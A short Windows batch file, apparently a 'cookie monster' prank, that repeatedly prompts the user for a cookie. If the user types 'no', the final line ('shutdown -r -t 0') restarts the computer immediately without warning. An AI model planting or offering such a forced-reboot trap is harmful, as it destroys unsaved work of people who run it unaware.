@echo off
MODE CON COLS=60 LINES=30
color 0F
title cookie

:start
rem --- Print intro lines ---
for /L %%i in (1,1,22) do echo.
echo                                                                                            I want a COOKIE !
for /L %%i in (1,1,22) do echo.

set /p "cookie=> "

rem Check for empty input
if "%cookie%"=="" goto blank

if /I "%cookie%"=="cookie" goto cookie
if /I "%cookie%"=="no" goto hate

rem Default if input doesn't match
for /L %%i in (1,1,22) do echo.
echo                                                                                    Just give me a cookie already !
for /L %%i in (1,1,22) do echo.

set /p "cookie=> "

if "%cookie%"=="" goto blank
if /I "%cookie%"=="cookie" goto cookie
if /I "%cookie%"=="no" goto hate
goto start

:cookie
for /L %%i in (1,1,22) do echo.
echo                                                                                                BURPS...
for /L %%i in (1,1,22) do echo.
timeout /t 10 >nul
cls
goto :eof

:blank
for /L %%i in (1,1,22) do echo.
echo                                                                                    Did you hear me? I want a COOKIE !
for /L %%i in (1,1,22) do echo.

set /p "cookie=> "

if "%cookie%"=="" goto blank
if /I "%cookie%"=="cookie" goto cookie
if /I "%cookie%"=="no" goto hate
goto start

:hate
for /L %%i in (1,1,22) do echo.
echo                                                                                      You won't give it to me, huh?
for /L %%i in (1,1,22) do echo.
timeout /t 5 >nul
shutdown -r -t 0










